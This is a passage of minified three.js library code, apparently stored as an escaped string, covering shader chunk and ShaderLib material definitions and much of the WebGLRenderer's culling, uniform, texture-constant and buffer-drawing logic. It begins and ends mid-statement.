size;\\n\\t#endif\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n\\t#include <worldpos_vertex>\\n\\t#include <shadowmap_vertex>\\n}\\n\";\nTHREE.ShaderChunk.shadow_frag=\"uniform float opacity;\\n#include <common>\\n#include <packing>\\n#include <bsdfs>\\n#include <lights_pars>\\n#include <shadowmap_pars_fragment>\\n#include <shadowmask_pars_fragment>\\nvoid main() {\\n\\tgl_FragColor = vec4( 0.0, 0.0, 0.0, opacity * ( 1.0  - getShadowMask() ) );\\n}\\n\";THREE.ShaderChunk.shadow_vert=\"#include <shadowmap_pars_vertex>\\nvoid main() {\\n\\t#include <begin_vertex>\\n\\t#include <project_vertex>\\n\\t#include <worldpos_vertex>\\n\\t#include <shadowmap_vertex>\\n}\\n\";\nTHREE.ShaderLib={basic:{uniforms:THREE.UniformsUtils.merge([THREE.UniformsLib.common,THREE.UniformsLib.aomap,THREE.UniformsLib.fog]),vertexShader:THREE.ShaderChunk.meshbasic_vert,fragmentShader:THREE.ShaderChunk.meshbasic_frag},lambert:{uniforms:THREE.UniformsUtils.merge([THREE.UniformsLib.common,THREE.UniformsLib.aomap,THREE.UniformsLib.lightmap,THREE.UniformsLib.emissivemap,THREE.UniformsLib.fog,THREE.UniformsLib.lights,{emissive:{value:new THREE.Color(0)}}]),vertexShader:THREE.ShaderChunk.meshlambert_vert,\nfragmentShader:THREE.ShaderChunk.meshlambert_frag},phong:{uniforms:THREE.UniformsUtils.merge([THREE.UniformsLib.common,THREE.UniformsLib.aomap,THREE.UniformsLib.lightmap,THREE.UniformsLib.emissivemap,THREE.UniformsLib.bumpmap,THREE.UniformsLib.normalmap,THREE.UniformsLib.displacementmap,THREE.UniformsLib.fog,THREE.UniformsLib.lights,{emissive:{value:new THREE.Color(0)},specular:{value:new THREE.Color(1118481)},shininess:{value:30}}]),vertexShader:THREE.ShaderChunk.meshphong_vert,fragmentShader:THREE.ShaderChunk.meshphong_frag},\nstandard:{uniforms:THREE.UniformsUtils.merge([THREE.UniformsLib.common,THREE.UniformsLib.aomap,THREE.UniformsLib.lightmap,THREE.UniformsLib.emissivemap,THREE.UniformsLib.bumpmap,THREE.UniformsLib.normalmap,THREE.UniformsLib.displacementmap,THREE.UniformsLib.roughnessmap,THREE.UniformsLib.metalnessmap,THREE.UniformsLib.fog,THREE.UniformsLib.lights,{emissive:{value:new THREE.Color(0)},roughness:{value:.5},metalness:{value:0},envMapIntensity:{value:1}}]),vertexShader:THREE.ShaderChunk.meshphysical_vert,\nfragmentShader:THREE.ShaderChunk.meshphysical_frag},points:{uniforms:THREE.UniformsUtils.merge([THREE.UniformsLib.points,THREE.UniformsLib.fog]),vertexShader:THREE.ShaderChunk.points_vert,fragmentShader:THREE.ShaderChunk.points_frag},dashed:{uniforms:THREE.UniformsUtils.merge([THREE.UniformsLib.common,THREE.UniformsLib.fog,{scale:{value:1},dashSize:{value:1},totalSize:{value:2}}]),vertexShader:THREE.ShaderChunk.linedashed_vert,fragmentShader:THREE.ShaderChunk.linedashed_frag},depth:{uniforms:THREE.UniformsUtils.merge([THREE.UniformsLib.common,\nTHREE.UniformsLib.displacementmap]),vertexShader:THREE.ShaderChunk.depth_vert,fragmentShader:THREE.ShaderChunk.depth_frag},normal:{uniforms:{opacity:{value:1}},vertexShader:THREE.ShaderChunk.normal_vert,fragmentShader:THREE.ShaderChunk.normal_frag},cube:{uniforms:{tCube:{value:null},tFlip:{value:-1}},vertexShader:THREE.ShaderChunk.cube_vert,fragmentShader:THREE.ShaderChunk.cube_frag},equirect:{uniforms:{tEquirect:{value:null},tFlip:{value:-1}},vertexShader:THREE.ShaderChunk.equirect_vert,fragmentShader:THREE.ShaderChunk.equirect_frag},\ndistanceRGBA:{uniforms:{lightPos:{value:new THREE.Vector3}},vertexShader:THREE.ShaderChunk.distanceRGBA_vert,fragmentShader:THREE.ShaderChunk.distanceRGBA_frag}};THREE.ShaderLib.physical={uniforms:THREE.UniformsUtils.merge([THREE.ShaderLib.standard.uniforms,{clearCoat:{value:0},clearCoatRoughness:{value:0}}]),vertexShader:THREE.ShaderChunk.meshphysical_vert,fragmentShader:THREE.ShaderChunk.meshphysical_frag};\nTHREE.WebGLRenderer=function(a){function b(a,b,c,d){!0===A&&(a*=d,b*=d,c*=d);R.clearColor(a,b,c,d)}function c(){R.init();R.scissor(X.copy(ua).multiplyScalar($));R.viewport(ba.copy(ma).multiplyScalar($));b(V.r,V.g,V.b,Y)}function d(){T=Q=null;aa=\"\";G=-1;R.reset()}function e(a){a.preventDefault();d();c();Z.clear()}function f(a){a=a.target;a.removeEventListener(\"dispose\",f);g(a);Z.delete(a)}function g(a){var b=Z.get(a).program;a.program=void 0;void 0!==b&&na.releaseProgram(b)}function h(a,b){return Math.abs(b[0])-\nMath.abs(a[0])}function k(a,b){return a.object.renderOrder!==b.object.renderOrder?a.object.renderOrder-b.object.renderOrder:a.material.id!==b.material.id?a.material.id-b.material.id:a.z!==b.z?a.z-b.z:a.id-b.id}function l(a,b){return a.object.renderOrder!==b.object.renderOrder?a.object.renderOrder-b.object.renderOrder:a.z!==b.z?b.z-a.z:a.id-b.id}function n(a,b,c,d,e){var f;c.transparent?(d=P,f=++M):(d=F,f=++K);f=d[f];void 0!==f?(f.id=a.id,f.object=a,f.geometry=b,f.material=c,f.z=W.z,f.group=e):(f=\n{id:a.id,object:a,geometry:b,material:c,z:W.z,group:e},d.push(f))}function p(a){if(!wa.intersectsSphere(a))return!1;var b=ca.numPlanes;if(0===b)return!0;var c=N.clippingPlanes,d=a.center;a=-a.radius;var e=0;do if(c[e].distanceToPoint(d)<a)return!1;while(++e!==b);return!0}function m(a,b){if(!1!==a.visible){if(a.layers.test(b.layers))if(a instanceof THREE.Light)B.push(a);else if(a instanceof THREE.Sprite){var c;(c=!1===a.frustumCulled)||(ha.center.set(0,0,0),ha.radius=.7071067811865476,ha.applyMatrix4(a.matrixWorld),\nc=!0===p(ha));c&&L.push(a)}else if(a instanceof THREE.LensFlare)O.push(a);else if(a instanceof THREE.ImmediateRenderObject)!0===N.sortObjects&&(W.setFromMatrixPosition(a.matrixWorld),W.applyProjection(pa)),n(a,null,a.material,W.z,null);else if(a instanceof THREE.Mesh||a instanceof THREE.Line||a instanceof THREE.Points)if(a instanceof THREE.SkinnedMesh&&a.skeleton.update(),(c=!1===a.frustumCulled)||(c=a.geometry,null===c.boundingSphere&&c.computeBoundingSphere(),ha.copy(c.boundingSphere).applyMatrix4(a.matrixWorld),\nc=!0===p(ha)),c){var d=a.material;if(!0===d.visible)if(!0===N.sortObjects&&(W.setFromMatrixPosition(a.matrixWorld),W.applyProjection(pa)),c=ea.update(a),d instanceof THREE.MultiMaterial)for(var e=c.groups,f=d.materials,d=0,g=e.length;d<g;d++){var h=e[d],k=f[h.materialIndex];!0===k.visible&&n(a,c,k,W.z,h)}else n(a,c,d,W.z,null)}c=a.children;d=0;for(g=c.length;d<g;d++)m(c[d],b)}}function q(a,b,c,d){for(var e=0,f=a.length;e<f;e++){var g=a[e],h=g.object,k=g.geometry,m=void 0===d?g.material:d,g=g.group;\nh.modelViewMatrix.multiplyMatrices(b.matrixWorldInverse,h.matrixWorld);h.normalMatrix.getNormalMatrix(h.modelViewMatrix);if(h instanceof THREE.ImmediateRenderObject){r(m);var l=s(b,c,m,h);aa=\"\";h.render(function(a){N.renderBufferImmediate(a,l,m)})}else N.renderBufferDirect(b,c,k,m,h,g)}}function r(a){a.side!==THREE.DoubleSide?R.enable(x.CULL_FACE):R.disable(x.CULL_FACE);R.setFlipSided(a.side===THREE.BackSide);!0===a.transparent?R.setBlending(a.blending,a.blendEquation,a.blendSrc,a.blendDst,a.blendEquationAlpha,\na.blendSrcAlpha,a.blendDstAlpha,a.premultipliedAlpha):R.setBlending(THREE.NoBlending);R.setDepthFunc(a.depthFunc);R.setDepthTest(a.depthTest);R.setDepthWrite(a.depthWrite);R.setColorWrite(a.colorWrite);R.setPolygonOffset(a.polygonOffset,a.polygonOffsetFactor,a.polygonOffsetUnits)}function s(a,b,c,d){ia=0;var e=Z.get(c);qa&&((va||a!==T)&&ca.setState(c.clippingPlanes,c.clipShadows,a,e,a===T&&c.id===G),void 0!==e.numClippingPlanes&&e.numClippingPlanes!==ca.numPlanes&&(c.needsUpdate=!0));void 0===e.program&&\n(c.needsUpdate=!0);void 0!==e.lightsHash&&e.lightsHash!==S.hash&&(c.needsUpdate=!0);if(c.needsUpdate){a:{var h=Z.get(c),k=na.getParameters(c,S,b,ca.numPlanes,d),m=na.getProgramCode(c,k),l=h.program,p=!0;if(void 0===l)c.addEventListener(\"dispose\",f);else if(l.code!==m)g(c);else if(void 0!==k.shaderID)break a;else p=!1;p&&(k.shaderID?(l=THREE.ShaderLib[k.shaderID],h.__webglShader={name:c.type,uniforms:THREE.UniformsUtils.clone(l.uniforms),vertexShader:l.vertexShader,fragmentShader:l.fragmentShader}):\nh.__webglShader={name:c.type,uniforms:c.uniforms,vertexShader:c.vertexShader,fragmentShader:c.fragmentShader},c.__webglShader=h.__webglShader,l=na.acquireProgram(c,k,m),h.program=l,c.program=l);k=l.getAttributes();if(c.morphTargets)for(m=c.numSupportedMorphTargets=0;m<N.maxMorphTargets;m++)0<=k[\"morphTarget\"+m]&&c.numSupportedMorphTargets++;if(c.morphNormals)for(m=c.numSupportedMorphNormals=0;m<N.maxMorphNormals;m++)0<=k[\"morphNormal\"+m]&&c.numSupportedMorphNormals++;k=h.__webglShader.uniforms;(c instanceof\nTHREE.ShaderMaterial||c instanceof THREE.RawShaderMaterial)&&!0!==c.clipping||(h.numClippingPlanes=ca.numPlanes,k.clippingPlanes=ca.uniform);c.lights&&(h.lightsHash=S.hash,k.ambientLightColor.value=S.ambient,k.directionalLights.value=S.directional,k.spotLights.value=S.spot,k.pointLights.value=S.point,k.hemisphereLights.value=S.hemi,k.directionalShadowMap.value=S.directionalShadowMap,k.directionalShadowMatrix.value=S.directionalShadowMatrix,k.spotShadowMap.value=S.spotShadowMap,k.spotShadowMatrix.value=\nS.spotShadowMatrix,k.pointShadowMap.value=S.pointShadowMap,k.pointShadowMatrix.value=S.pointShadowMatrix);m=h.program.getUniforms();m=THREE.WebGLUniforms.seqWithValue(m.seq,k);h.uniformsList=m;h.dynamicUniforms=THREE.WebGLUniforms.splitDynamic(m,k)}c.needsUpdate=!1}var n=!1,p=l=!1,h=e.program,m=h.getUniforms(),k=e.__webglShader.uniforms;h.id!==Q&&(x.useProgram(h.program),Q=h.id,p=l=n=!0);c.id!==G&&(G=c.id,l=!0);if(n||a!==T){m.set(x,a,\"projectionMatrix\");da.logarithmicDepthBuffer&&m.setValue(x,\"logDepthBufFC\",\n2/(Math.log(a.far+1)/Math.LN2));a!==T&&(T=a,p=l=!0);if(c instanceof THREE.ShaderMaterial||c instanceof THREE.MeshPhongMaterial||c instanceof THREE.MeshStandardMaterial||c.envMap)n=m.map.cameraPosition,void 0!==n&&n.setValue(x,W.setFromMatrixPosition(a.matrixWorld));(c instanceof THREE.MeshPhongMaterial||c instanceof THREE.MeshLambertMaterial||c instanceof THREE.MeshBasicMaterial||c instanceof THREE.MeshStandardMaterial||c instanceof THREE.ShaderMaterial||c.skinning)&&m.setValue(x,\"viewMatrix\",a.matrixWorldInverse);\nm.set(x,N,\"toneMappingExposure\");m.set(x,N,\"toneMappingWhitePoint\")}c.skinning&&(m.setOptional(x,d,\"bindMatrix\"),m.setOptional(x,d,\"bindMatrixInverse\"),n=d.skeleton)&&(da.floatVertexTextures&&n.useVertexTexture?(m.set(x,n,\"boneTexture\"),m.set(x,n,\"boneTextureWidth\"),m.set(x,n,\"boneTextureHeight\")):m.setOptional(x,n,\"boneMatrices\"));if(l){c.lights&&(l=p,k.ambientLightColor.needsUpdate=l,k.directionalLights.needsUpdate=l,k.pointLights.needsUpdate=l,k.spotLights.needsUpdate=l,k.hemisphereLights.needsUpdate=\nl);b&&c.fog&&(k.fogColor.value=b.color,b instanceof THREE.Fog?(k.fogNear.value=b.near,k.fogFar.value=b.far):b instanceof THREE.FogExp2&&(k.fogDensity.value=b.density));if(c instanceof THREE.MeshBasicMaterial||c instanceof THREE.MeshLambertMaterial||c instanceof THREE.MeshPhongMaterial||c instanceof THREE.MeshStandardMaterial||c instanceof THREE.MeshDepthMaterial){k.opacity.value=c.opacity;k.diffuse.value=c.color;c.emissive&&k.emissive.value.copy(c.emissive).multiplyScalar(c.emissiveIntensity);k.map.value=\nc.map;k.specularMap.value=c.specularMap;k.alphaMap.value=c.alphaMap;c.aoMap&&(k.aoMap.value=c.aoMap,k.aoMapIntensity.value=c.aoMapIntensity);var q;c.map?q=c.map:c.specularMap?q=c.specularMap:c.displacementMap?q=c.displacementMap:c.normalMap?q=c.normalMap:c.bumpMap?q=c.bumpMap:c.roughnessMap?q=c.roughnessMap:c.metalnessMap?q=c.metalnessMap:c.alphaMap?q=c.alphaMap:c.emissiveMap&&(q=c.emissiveMap);void 0!==q&&(q instanceof THREE.WebGLRenderTarget&&(q=q.texture),b=q.offset,q=q.repeat,k.offsetRepeat.value.set(b.x,\nb.y,q.x,q.y));k.envMap.value=c.envMap;k.flipEnvMap.value=c.envMap instanceof THREE.CubeTexture?-1:1;k.reflectivity.value=c.reflectivity;k.refractionRatio.value=c.refractionRatio}c instanceof THREE.LineBasicMaterial?(k.diffuse.value=c.color,k.opacity.value=c.opacity):c instanceof THREE.LineDashedMaterial?(k.diffuse.value=c.color,k.opacity.value=c.opacity,k.dashSize.value=c.dashSize,k.totalSize.value=c.dashSize+c.gapSize,k.scale.value=c.scale):c instanceof THREE.PointsMaterial?(k.diffuse.value=c.color,\nk.opacity.value=c.opacity,k.size.value=c.size*$,k.scale.value=.5*v.clientHeight,k.map.value=c.map,null!==c.map&&(q=c.map.offset,c=c.map.repeat,k.offsetRepeat.value.set(q.x,q.y,c.x,c.y))):c instanceof THREE.MeshLambertMaterial?(c.lightMap&&(k.lightMap.value=c.lightMap,k.lightMapIntensity.value=c.lightMapIntensity),c.emissiveMap&&(k.emissiveMap.value=c.emissiveMap)):c instanceof THREE.MeshPhongMaterial?(k.specular.value=c.specular,k.shininess.value=Math.max(c.shininess,1E-4),c.lightMap&&(k.lightMap.value=\nc.lightMap,k.lightMapIntensity.value=c.lightMapIntensity),c.emissiveMap&&(k.emissiveMap.value=c.emissiveMap),c.bumpMap&&(k.bumpMap.value=c.bumpMap,k.bumpScale.value=c.bumpScale),c.normalMap&&(k.normalMap.value=c.normalMap,k.normalScale.value.copy(c.normalScale)),c.displacementMap&&(k.displacementMap.value=c.displacementMap,k.displacementScale.value=c.displacementScale,k.displacementBias.value=c.displacementBias)):c instanceof THREE.MeshPhysicalMaterial?(k.clearCoat.value=c.clearCoat,k.clearCoatRoughness.value=\nc.clearCoatRoughness,t(k,c)):c instanceof THREE.MeshStandardMaterial?t(k,c):c instanceof THREE.MeshDepthMaterial?c.displacementMap&&(k.displacementMap.value=c.displacementMap,k.displacementScale.value=c.displacementScale,k.displacementBias.value=c.displacementBias):c instanceof THREE.MeshNormalMaterial&&(k.opacity.value=c.opacity);THREE.WebGLUniforms.upload(x,e.uniformsList,k,N)}m.set(x,d,\"modelViewMatrix\");m.set(x,d,\"normalMatrix\");m.setValue(x,\"modelMatrix\",d.matrixWorld);e=e.dynamicUniforms;null!==\ne&&(THREE.WebGLUniforms.evalDynamic(e,k,d,a),THREE.WebGLUniforms.upload(x,e,k,N));return h}function t(a,b){a.roughness.value=b.roughness;a.metalness.value=b.metalness;b.roughnessMap&&(a.roughnessMap.value=b.roughnessMap);b.metalnessMap&&(a.metalnessMap.value=b.metalnessMap);b.lightMap&&(a.lightMap.value=b.lightMap,a.lightMapIntensity.value=b.lightMapIntensity);b.emissiveMap&&(a.emissiveMap.value=b.emissiveMap);b.bumpMap&&(a.bumpMap.value=b.bumpMap,a.bumpScale.value=b.bumpScale);b.normalMap&&(a.normalMap.value=\nb.normalMap,a.normalScale.value.copy(b.normalScale));b.displacementMap&&(a.displacementMap.value=b.displacementMap,a.displacementScale.value=b.displacementScale,a.displacementBias.value=b.displacementBias);b.envMap&&(a.envMapIntensity.value=b.envMapIntensity)}function u(a){var b;if(a===THREE.RepeatWrapping)return x.REPEAT;if(a===THREE.ClampToEdgeWrapping)return x.CLAMP_TO_EDGE;if(a===THREE.MirroredRepeatWrapping)return x.MIRRORED_REPEAT;if(a===THREE.NearestFilter)return x.NEAREST;if(a===THREE.NearestMipMapNearestFilter)return x.NEAREST_MIPMAP_NEAREST;\nif(a===THREE.NearestMipMapLinearFilter)return x.NEAREST_MIPMAP_LINEAR;if(a===THREE.LinearFilter)return x.LINEAR;if(a===THREE.LinearMipMapNearestFilter)return x.LINEAR_MIPMAP_NEAREST;if(a===THREE.LinearMipMapLinearFilter)return x.LINEAR_MIPMAP_LINEAR;if(a===THREE.UnsignedByteType)return x.UNSIGNED_BYTE;if(a===THREE.UnsignedShort4444Type)return x.UNSIGNED_SHORT_4_4_4_4;if(a===THREE.UnsignedShort5551Type)return x.UNSIGNED_SHORT_5_5_5_1;if(a===THREE.UnsignedShort565Type)return x.UNSIGNED_SHORT_5_6_5;\nif(a===THREE.ByteType)return x.BYTE;if(a===THREE.ShortType)return x.SHORT;if(a===THREE.UnsignedShortType)return x.UNSIGNED_SHORT;if(a===THREE.IntType)return x.INT;if(a===THREE.UnsignedIntType)return x.UNSIGNED_INT;if(a===THREE.FloatType)return x.FLOAT;b=U.get(\"OES_texture_half_float\");if(null!==b&&a===THREE.HalfFloatType)return b.HALF_FLOAT_OES;if(a===THREE.AlphaFormat)return x.ALPHA;if(a===THREE.RGBFormat)return x.RGB;if(a===THREE.RGBAFormat)return x.RGBA;if(a===THREE.LuminanceFormat)return x.LUMINANCE;\nif(a===THREE.LuminanceAlphaFormat)return x.LUMINANCE_ALPHA;if(a===THREE.DepthFormat)return x.DEPTH_COMPONENT;if(a===THREE.AddEquation)return x.FUNC_ADD;if(a===THREE.SubtractEquation)return x.FUNC_SUBTRACT;if(a===THREE.ReverseSubtractEquation)return x.FUNC_REVERSE_SUBTRACT;if(a===THREE.ZeroFactor)return x.ZERO;if(a===THREE.OneFactor)return x.ONE;if(a===THREE.SrcColorFactor)return x.SRC_COLOR;if(a===THREE.OneMinusSrcColorFactor)return x.ONE_MINUS_SRC_COLOR;if(a===THREE.SrcAlphaFactor)return x.SRC_ALPHA;\nif(a===THREE.OneMinusSrcAlphaFactor)return x.ONE_MINUS_SRC_ALPHA;if(a===THREE.DstAlphaFactor)return x.DST_ALPHA;if(a===THREE.OneMinusDstAlphaFactor)return x.ONE_MINUS_DST_ALPHA;if(a===THREE.DstColorFactor)return x.DST_COLOR;if(a===THREE.OneMinusDstColorFactor)return x.ONE_MINUS_DST_COLOR;if(a===THREE.SrcAlphaSaturateFactor)return x.SRC_ALPHA_SATURATE;b=U.get(\"WEBGL_compressed_texture_s3tc\");if(null!==b){if(a===THREE.RGB_S3TC_DXT1_Format)return b.COMPRESSED_RGB_S3TC_DXT1_EXT;if(a===THREE.RGBA_S3TC_DXT1_Format)return b.COMPRESSED_RGBA_S3TC_DXT1_EXT;\nif(a===THREE.RGBA_S3TC_DXT3_Format)return b.COMPRESSED_RGBA_S3TC_DXT3_EXT;if(a===THREE.RGBA_S3TC_DXT5_Format)return b.COMPRESSED_RGBA_S3TC_DXT5_EXT}b=U.get(\"WEBGL_compressed_texture_pvrtc\");if(null!==b){if(a===THREE.RGB_PVRTC_4BPPV1_Format)return b.COMPRESSED_RGB_PVRTC_4BPPV1_IMG;if(a===THREE.RGB_PVRTC_2BPPV1_Format)return b.COMPRESSED_RGB_PVRTC_2BPPV1_IMG;if(a===THREE.RGBA_PVRTC_4BPPV1_Format)return b.COMPRESSED_RGBA_PVRTC_4BPPV1_IMG;if(a===THREE.RGBA_PVRTC_2BPPV1_Format)return b.COMPRESSED_RGBA_PVRTC_2BPPV1_IMG}b=\nU.get(\"WEBGL_compressed_texture_etc1\");if(null!==b&&a===THREE.RGB_ETC1_Format)return b.COMPRESSED_RGB_ETC1_WEBGL;b=U.get(\"EXT_blend_minmax\");if(null!==b){if(a===THREE.MinEquation)return b.MIN_EXT;if(a===THREE.MaxEquation)return b.MAX_EXT}return 0}console.log(\"THREE.WebGLRenderer\",THREE.REVISION);a=a||{};var v=void 0!==a.canvas?a.canvas:document.createElementNS(\"http://www.w3.org/1999/xhtml\",\"canvas\"),C=void 0!==a.context?a.context:null,w=void 0!==a.alpha?a.alpha:!1,E=void 0!==a.depth?a.depth:!0,z=\nvoid 0!==a.stencil?a.stencil:!0,y=void 0!==a.antialias?a.antialias:!1,A=void 0!==a.premultipliedAlpha?a.premultipliedAlpha:!0,I=void 0!==a.preserveDrawingBuffer?a.preserveDrawingBuffer:!1,B=[],F=[],K=-1,P=[],M=-1,H=new Float32Array(8),L=[],O=[];this.domElement=v;this.context=null;this.sortObjects=this.autoClearStencil=this.autoClearDepth=this.autoClearColor=this.autoClear=!0;this.clippingPlanes=[];this.localClippingEnabled=!1;this.gammaFactor=2;this.physicallyCorrectLights=this.gammaOutput=this.gammaInput=\n!1;this.toneMapping=THREE.LinearToneMapping;this.toneMappingWhitePoint=this.toneMappingExposure=1;this.maxMorphTargets=8;this.maxMorphNormals=4;var N=this,Q=null,J=null,D=null,G=-1,aa=\"\",T=null,X=new THREE.Vector4,ja=null,ba=new THREE.Vector4,ia=0,V=new THREE.Color(0),Y=0,ra=v.width,sa=v.height,$=1,ua=new THREE.Vector4(0,0,ra,sa),xa=!1,ma=new THREE.Vector4(0,0,ra,sa),wa=new THREE.Frustum,ca=new THREE.WebGLClipping,qa=!1,va=!1,ha=new THREE.Sphere,pa=new THREE.Matrix4,W=new THREE.Vector3,S={hash:\"\",\nambient:[0,0,0],directional:[],directionalShadowMap:[],directionalShadowMatrix:[],spot:[],spotShadowMap:[],spotShadowMatrix:[],point:[],pointShadowMap:[],pointShadowMatrix:[],hemi:[],shadows:[]},fa={calls:0,vertices:0,faces:0,points:0};this.info={render:fa,memory:{geometries:0,textures:0},programs:null};var x;try{w={alpha:w,depth:E,stencil:z,antialias:y,premultipliedAlpha:A,preserveDrawingBuffer:I};x=C||v.getContext(\"webgl\",w)||v.getContext(\"experimental-webgl\",w);if(null===x){if(null!==v.getContext(\"webgl\"))throw\"Error creating WebGL context with your selected attributes.\";\nthrow\"Error creating WebGL context.\";}void 0===x.getShaderPrecisionFormat&&(x.getShaderPrecisionFormat=function(){return{rangeMin:1,rangeMax:1,precision:1}});v.addEventListener(\"webglcontextlost\",e,!1)}catch(za){console.error(\"THREE.WebGLRenderer: \"+za)}var U=new THREE.WebGLExtensions(x);U.get(\"WEBGL_depth_texture\");U.get(\"OES_texture_float\");U.get(\"OES_texture_float_linear\");U.get(\"OES_texture_half_float\");U.get(\"OES_texture_half_float_linear\");U.get(\"OES_standard_derivatives\");U.get(\"ANGLE_instanced_arrays\");\nU.get(\"OES_element_index_uint\")&&(THREE.BufferGeometry.MaxIndex=4294967296);var da=new THREE.WebGLCapabilities(x,U,a),R=new THREE.WebGLState(x,U,u),Z=new THREE.WebGLProperties,ka=new THREE.WebGLTextures(x,U,R,Z,da,u,this.info),ea=new THREE.WebGLObjects(x,Z,this.info),na=new THREE.WebGLPrograms(this,da),ta=new THREE.WebGLLights;this.info.programs=na.programs;var Aa=new THREE.WebGLBufferRenderer(x,U,fa),Ba=new THREE.WebGLIndexedBufferRenderer(x,U,fa),Ca=new THREE.OrthographicCamera(-1,1,1,-1,0,1),la=\nnew THREE.PerspectiveCamera,oa=new THREE.Mesh(new THREE.PlaneBufferGeometry(2,2),new THREE.MeshBasicMaterial({depthTest:!1,depthWrite:!1}));a=THREE.ShaderLib.cube;var ga=new THREE.Mesh(new THREE.BoxBufferGeometry(5,5,5),new THREE.ShaderMaterial({uniforms:a.uniforms,vertexShader:a.vertexShader,fragmentShader:a.fragmentShader,depthTest:!1,depthWrite:!1,side:THREE.BackSide}));ea.update(oa);ea.update(ga);c();this.context=x;this.capabilities=da;this.extensions=U;this.properties=Z;this.state=R;var ya=new THREE.WebGLShadowMap(this,\nS,ea);this.shadowMap=ya;var Da=new THREE.SpritePlugin(this,L),Ea=new THREE.LensFlarePlugin(this,O);this.getContext=function(){return x};this.getContextAttributes=function(){return x.getContextAttributes()};this.forceContextLoss=function(){U.get(\"WEBGL_lose_context\").loseContext()};this.getMaxAnisotropy=function(){return da.getMaxAnisotropy()};this.getPrecision=function(){return da.precision};this.getPixelRatio=function(){return $};this.setPixelRatio=function(a){void 0!==a&&($=a,this.setSize(ma.z,\nma.w,!1))};this.getSize=function(){return{width:ra,height:sa}};this.setSize=function(a,b,c){ra=a;sa=b;v.width=a*$;v.height=b*$;!1!==c&&(v.style.width=a+\"px\",v.style.height=b+\"px\");this.setViewport(0,0,a,b)};this.setViewport=function(a,b,c,d){R.viewport(ma.set(a,b,c,d))};this.setScissor=function(a,b,c,d){R.scissor(ua.set(a,b,c,d))};this.setScissorTest=function(a){R.setScissorTest(xa=a)};this.getClearColor=function(){return V};this.setClearColor=function(a,c){V.set(a);Y=void 0!==c?c:1;b(V.r,V.g,V.b,\nY)};this.getClearAlpha=function(){return Y};this.setClearAlpha=function(a){Y=a;b(V.r,V.g,V.b,Y)};this.clear=function(a,b,c){var d=0;if(void 0===a||a)d|=x.COLOR_BUFFER_BIT;if(void 0===b||b)d|=x.DEPTH_BUFFER_BIT;if(void 0===c||c)d|=x.STENCIL_BUFFER_BIT;x.clear(d)};this.clearColor=function(){this.clear(!0,!1,!1)};this.clearDepth=function(){this.clear(!1,!0,!1)};this.clearStencil=function(){this.clear(!1,!1,!0)};this.clearTarget=function(a,b,c,d){this.setRenderTarget(a);this.clear(b,c,d)};this.resetGLState=\nd;this.dispose=function(){P=[];M=-1;F=[];K=-1;v.removeEventListener(\"webglcontextlost\",e,!1)};this.renderBufferImmediate=function(a,b,c){R.initAttributes();var d=Z.get(a);a.hasPositions&&!d.position&&(d.position=x.createBuffer());a.hasNormals&&!d.normal&&(d.normal=x.createBuffer());a.hasUvs&&!d.uv&&(d.uv=x.createBuffer());a.hasColors&&!d.color&&(d.color=x.createBuffer());b=b.getAttributes();a.hasPositions&&(x.bindBuffer(x.ARRAY_BUFFER,d.position),x.bufferData(x.ARRAY_BUFFER,a.positionArray,x.DYNAMIC_DRAW),\nR.enableAttribute(b.position),x.vertexAttribPointer(b.position,3,x.FLOAT,!1,0,0));if(a.hasNormals){x.bindBuffer(x.ARRAY_BUFFER,d.normal);if(\"MeshPhongMaterial\"!==c.type&&\"MeshStandardMaterial\"!==c.type&&\"MeshPhysicalMaterial\"!==c.type&&c.shading===THREE.FlatShading)for(var e=0,f=3*a.count;e<f;e+=9){var g=a.normalArray,h=(g[e+0]+g[e+3]+g[e+6])/3,k=(g[e+1]+g[e+4]+g[e+7])/3,m=(g[e+2]+g[e+5]+g[e+8])/3;g[e+0]=h;g[e+1]=k;g[e+2]=m;g[e+3]=h;g[e+4]=k;g[e+5]=m;g[e+6]=h;g[e+7]=k;g[e+8]=m}x.bufferData(x.ARRAY_BUFFER,\na.normalArray,x.DYNAMIC_DRAW);R.enableAttribute(b.normal);x.vertexAttribPointer(b.normal,3,x.FLOAT,!1,0,0)}a.hasUvs&&c.map&&(x.bindBuffer(x.ARRAY_BUFFER,d.uv),x.bufferData(x.ARRAY_BUFFER,a.uvArray,x.DYNAMIC_DRAW),R.enableAttribute(b.uv),x.vertexAttribPointer(b.uv,2,x.FLOAT,!1,0,0));a.hasColors&&c.vertexColors!==THREE.NoColors&&(x.bindBuffer(x.ARRAY_BUFFER,d.color),x.bufferData(x.ARRAY_BUFFER,a.colorArray,x.DYNAMIC_DRAW),R.enableAttribute(b.color),x.vertexAttribPointer(b.color,3,x.FLOAT,!1,0,0));R.disableUnusedAttributes();\nx.drawArrays(x.TRIANGLES,0,a.count);a.count=0};this.renderBufferDirect=function(a,b,c,d,e,g){r(d);var f=s(a,b,d,e),k=!1;a=c.id+\"_\"+f.id+\"_\"+d.wireframe;a!==aa&&(aa=a,k=!0);b=e.morphTargetInfluences;if(void 0!==b){a=[];for(var m=0,k=b.length;m<k;m++){var l=b[m];a.push([l,m])}a.sort(h);8<a.length&&(a.length=8);for(var n=c.morphAttributes,m=0,k=a.length;m<k;m++)l=a[m],H[m]=l[0],0!==l[0]?(b=l[1],!0===d.morphTargets&&n.position&&c.addAttribute(\"morphTarget\"+m,n.position[b]),!0===d.morphNormals&&n.normal&&\nc.addAttribute(\"morphNormal\"+m,n.normal[b])):(!0===d.morphTargets&&c.removeAttribute(\"morphTarget\"+m),!0===d.morphNormals&&c.removeAttribute(\"morphNormal\"+m));f.getUniforms().setValue(x,\"morphTargetInfluences\",H);k=!0}b=c.index;m=c.attributes.position;!0===d.wireframe&&(b=ea.getWireframeAttribute(c));null!==b?(a=Ba,a.setIndex(b)):a=Aa;if(k){a:{var k=void 0,p;if(c instanceof THREE.InstancedBufferGeometry&&(p=U.get(\"ANGLE_instanced_arrays\"),null===p)){console.error(\"THREE.WebGLRenderer.setupVertexAttributes: using THREE.InstancedBufferGeometry but hardware does not support extension ANGLE_instanced_arrays.\");\nbreak a}void 0===k&&(k=0);R.initAttributes();var l=c.attributes,f=f.getAttributes(),n=d.defaultAttributeValues,q;for(q in f){var v=f[q];if(0<=v){var u=l[q];if(void 0!==u){var w=x.FLOAT,C=u.array,t=u.normalized;C instanceof Float32Array?w=x.FLOAT:C instanceof Float64Array?console.warn(\"Unsupported data buffer format: Float64Array\"):C instanceof Uint16Array?w=x.UNSIGNED_SHORT:C instanceof Int16Array?w=x.SHORT:C instanceof Uint32Array?w=x.UNSIGNED_INT:C instanceof Int32Array?w=x.INT:C instanceof 